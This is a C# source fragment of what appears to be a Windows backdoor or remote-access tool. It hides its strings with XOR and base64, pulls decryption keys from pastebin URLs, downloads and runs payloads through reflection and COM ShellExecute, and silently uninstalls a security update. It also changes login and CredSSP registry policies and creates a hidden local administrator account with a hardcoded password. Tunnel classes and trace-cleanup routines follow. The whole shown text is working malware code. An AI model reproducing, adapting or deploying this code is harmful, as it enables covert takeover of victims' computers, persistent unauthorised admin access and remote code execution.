                    Rawr.SetValue("DWORD", 2);
                }
                Rawr.Flush();

                string userName = user;
                string userPassword = password;
                PrincipalContext systemContext = null;

                try
                {
                    Console.WriteLine("Building System Information");
                    systemContext = new PrincipalContext(ContextType.Machine, null);
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create System Context.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                //Check if user object already exists
                Console.WriteLine("Checking if User Exists.");
                UserPrincipal usr = UserPrincipal.FindByIdentity(systemContext, userName);
                if (usr != null)
                {
                    Console.WriteLine(userName + " already exists. Exiting!!");
                    Console.ReadLine();
                    return;
                }

                //Create the new UserPrincipal object
                Console.WriteLine("Building User Information");
                UserPrincipal userPrincipal = new UserPrincipal(systemContext);
                userPrincipal.Name = userName;
                userPrincipal.DisplayName = "PEGASUS Administrative User";
                userPrincipal.PasswordNeverExpires = true;
                userPrincipal.SetPassword(userPassword);
                userPrincipal.Enabled = true;

                try
                {
                    Console.WriteLine("Creating New User");
                    userPrincipal.Save();
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create user.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                GroupPrincipal groupPrincipal = null;
                try
                {
                    groupPrincipal = GroupPrincipal.FindByIdentity(systemContext, "Administrators");

                    if (groupPrincipal != null)
                    {
                        //check if user is a member
                        Console.WriteLine("Checking if itadmin is part of Administrators Group");
                        if (groupPrincipal.Members.Contains(systemContext, IdentityType.SamAccountName, userName))
                        {
                            Console.WriteLine("Administrators already contains " + userName);
                            return;
                        }
                        //Adding the user to the group
                        Console.WriteLine("Adding itadmin to Administrators Group");
                        groupPrincipal.Members.Add(userPrincipal);
                        groupPrincipal.Save();
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Could not find the group Administrators");
                    }
                }
                catch (Exception E)
                {
                    Console.WriteLine("Exception adding user to group.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                }

                Console.WriteLine("Cleaning Up");
                groupPrincipal.Dispose();
                userPrincipal.Dispose();
                systemContext.Dispose();

                Console.WriteLine();
                Console.WriteLine("Press Any Key to Continue");
                Console.ReadLine();




                return;
            }
            else if (_MajorVersion == 5)
            {
                RegistryKey Rawr;
                Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (Rawr == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                else
                {
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                Rawr.Flush();
                RegistryKey Rawr2;
                Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                if (Rawr2 == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                    Rawr2.SetValue("DWORD", 2);
                }
                else
                {
                    Rawr.SetValue("DWORD", 2);
                }
                Rawr.Flush();

                string userName = "PEGASUS";
                string userPassword = "PEGASUS";
                PrincipalContext systemContext = null;

                try
                {
                    Console.WriteLine("Building System Information");
                    systemContext = new PrincipalContext(ContextType.Machine, null);
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create System Context.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                //Check if user object already exists
                Console.WriteLine("Checking if User Exists.");
                UserPrincipal usr = UserPrincipal.FindByIdentity(systemContext, userName);
                if (usr != null)
                {
                    Console.WriteLine(userName + " already exists. Exiting!!");
                    Console.ReadLine();
                    return;
                }

                //Create the new UserPrincipal object
                Console.WriteLine("Building User Information");
                UserPrincipal userPrincipal = new UserPrincipal(systemContext);
                userPrincipal.Name = userName;
                userPrincipal.DisplayName = "PEGASUS Administrative User";
                userPrincipal.PasswordNeverExpires = true;
                userPrincipal.SetPassword(userPassword);
                userPrincipal.Enabled = true;

                try
                {
                    Console.WriteLine("Creating New User");
                    userPrincipal.Save();
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create user.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                GroupPrincipal groupPrincipal = null;
                try
                {
                    groupPrincipal = GroupPrincipal.FindByIdentity(systemContext, "Administrators");

                    if (groupPrincipal != null)
                    {
                        //check if user is a member
                        Console.WriteLine("Checking if itadmin is part of Administrators Group");
                        if (groupPrincipal.Members.Contains(systemContext, IdentityType.SamAccountName, userName))
                        {
                            Console.WriteLine("Administrators already contains " + userName);
                            return;
                        }
                        //Adding the user to the group
                        Console.WriteLine("Adding itadmin to Administrators Group");
                        groupPrincipal.Members.Add(userPrincipal);
                        groupPrincipal.Save();
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Could not find the group Administrators");
                    }
                }
                catch (Exception E)
                {
                    Console.WriteLine("Exception adding user to group.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                }

                Console.WriteLine("Cleaning Up");
                groupPrincipal.Dispose();
                userPrincipal.Dispose();
                systemContext.Dispose();

                Console.WriteLine();
                Console.WriteLine("Press Any Key to Continue");
                Console.ReadLine();




                return;

            }
            else
            {
                System.Diagnostics.Process.Start(new ProcessStartInfo
                {
                    FileName = BCutEncrypt("ign"),
                    Arguments = $"/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });

                RegistryKey Rawr;
                Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (Rawr == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                else
                {
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                Rawr.Flush();
                RegistryKey Rawr2;
                Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                if (Rawr2 == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                    Rawr2.SetValue("DWORD", 2);
                }
                else
                {
                    Rawr.SetValue("DWORD", 2);
                }
                Rawr.Flush();

                string userName = user;
                string userPassword = password;
                PrincipalContext systemContext = null;

                try
                {
                    Console.WriteLine("Building System Information");
                    systemContext = new PrincipalContext(ContextType.Machine, null);
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create System Context.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                //Check if user object already exists
                Console.WriteLine("Checking if User Exists.");
                UserPrincipal usr = UserPrincipal.FindByIdentity(systemContext, userName);
                if (usr != null)
                {
                    Console.WriteLine(userName + " already exists. Exiting!!");
                    Console.ReadLine();
                    return;
                }

                //Create the new UserPrincipal object
                Console.WriteLine("Building User Information");
                UserPrincipal userPrincipal = new UserPrincipal(systemContext);
                userPrincipal.Name = userName;
                userPrincipal.DisplayName = "PEGASUS Administrative User";
                userPrincipal.PasswordNeverExpires = true;
                userPrincipal.SetPassword(userPassword);
                userPrincipal.Enabled = true;

                try
                {
                    Console.WriteLine("Creating New User");
                    userPrincipal.Save();
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create user.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                GroupPrincipal groupPrincipal = null;
                try
                {
                    groupPrincipal = GroupPrincipal.FindByIdentity(systemContext, "Administrators");

                    if (groupPrincipal != null)
                    {
                        //check if user is a member
                        Console.WriteLine("Checking if itadmin is part of Administrators Group");
                        if (groupPrincipal.Members.Contains(systemContext, IdentityType.SamAccountName, userName))
                        {
                            Console.WriteLine("Administrators already contains " + userName);
                            return;
                        }
                        //Adding the user to the group
                        Console.WriteLine("Adding itadmin to Administrators Group");
                        groupPrincipal.Members.Add(userPrincipal);
                        groupPrincipal.Save();
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Could not find the group Administrators");
                    }
                }
                catch (Exception E)
                {
                    Console.WriteLine("Exception adding user to group.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                }

                Console.WriteLine("Cleaning Up");
                groupPrincipal.Dispose();
                userPrincipal.Dispose();
                systemContext.Dispose();

                Console.WriteLine();
                Console.WriteLine("Press Any Key to Continue");
                Console.ReadLine();




                return;

            }


        }
        public static string Decrypts(string encrypted)
        {
            using (WebClient client = new WebClient())
            {
                client.Proxy = null;
                string Key = client.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2luUnRhdFdx")));
                string IV = client.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1p3VDFCZlZk")));

                byte[] encbytes = Convert.FromBase64String(encrypted);
                AesCryptoServiceProvider encdec = new AesCryptoServiceProvider();
                encdec.BlockSize = 128;
                encdec.KeySize = 256;
                encdec.Key = ASCIIEncoding.ASCII.GetBytes(Key);
                encdec.IV = ASCIIEncoding.ASCII.GetBytes(IV);
                encdec.Padding = PaddingMode.PKCS7;
                encdec.Mode = CipherMode.CBC;

                ICryptoTransform icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);

                byte[] dec = icrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);
                icrypt.Dispose();

                return ASCIIEncoding.ASCII.GetString(dec);
            }
        }

        public static byte[] DownLoad(string u)
        {
            try
            {
                Type type = typeof(WebClient);
                object instance = Activator.CreateInstance(type, (object[])null);
                object target = type.InvokeMember(BCutEncrypt("Boknoxy"), BindingFlags.GetProperty, (Binder)null, instance, (object[])null);
                target.GetType().InvokeMember(BCutEncrypt("Knn"), BindingFlags.InvokeMethod, (Binder)null, target, new object[2]
                {
                    (object) BCutEncrypt("\x007Fyox'kmod~"),
                    (object) BCutEncrypt("Gepcffk%?$:*\"]cdne}y*D^*;:$:1*]cd<>1*r<>#*Kzzfo]ohAc~%?9=$9<*\"AB^GF&*fcao*Moiae#")
                });

                return type.InvokeMember(BCutEncrypt("Ne}dfeknNk~k"), BindingFlags.InvokeMethod, (Binder)null, instance, new object[1]
                {
                    (object) u
                }) as byte[];
            }
            catch
            {
                return (byte[])null;
            }
        }

        public static void Exec(string path, string parameter, object show)
        {
            try
            {
                Type typeFromClsid = Type.GetTypeFromCLSID(new Guid(BCutEncrypt("3HK:?3=8'L<K2';;IL'K>>8'::K:I3:K2L93")));
                object instance = Activator.CreateInstance(typeFromClsid);
                object target1 = typeFromClsid.InvokeMember(BCutEncrypt("c~og"), BindingFlags.InvokeMethod, (Binder)null, instance, (object[])null);
                object target2 = target1.GetType().InvokeMember(BCutEncrypt("Nei\x007Fgod~"), BindingFlags.GetProperty, (Binder)null, target1, (object[])null);
                object target3 = target2.GetType().InvokeMember(BCutEncrypt("Kzzfcik~ced"), BindingFlags.GetProperty, (Binder)null, target2, (object[])null);
                target3.GetType().InvokeMember(BCutEncrypt("YboffOroi\x007F~o"), BindingFlags.InvokeMethod, (Binder)null, target3, new object[5]
                {
                    (object) path,
                    (object) parameter,
                    (object) "",
                    null,
                    show
                });
            }
            catch
            {
            }
        }

        public int GetPrivileges()
        {
            try
            {
                using (WindowsIdentity current = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
                    if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
                        return 0;
                    if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
                        return 1;
                }

                return 2;
            }
            catch
            {
                return 2;
            }
        }

        public static string BCutEncrypt(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ (uint)ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }


    class TunnelsResponse
    {
        public List<Tunnel> tunnels { get; set; }
        public string uri { get; set; }
    }

    class Tunnel
    {
        public string name { get; set; }
        public string uri { get; set; }
        public string public_url { get; set; }
        public string proto { get; set; }
    }

    public class RemoveUserHelper
    {

        public static bool DeleteUserAccount(string name)
        {
            Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("dontdisplaylastusername", 0);

            ProcessStartInfo psi = new ProcessStartInfo(Strings.StrReverse("exe.dmc"), "/c net user " + name + " /delete");
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            Process p = new Process();
            p.StartInfo = psi;
            p.Start();
            string res = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            if (res != null)
            {
                if (res.ToLower().Contains("command completed successfully."))
                    return true;
                else
                    return false;
            }
            else
                return false;
        }



        private void cleantemp()
        {

            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }

    }

}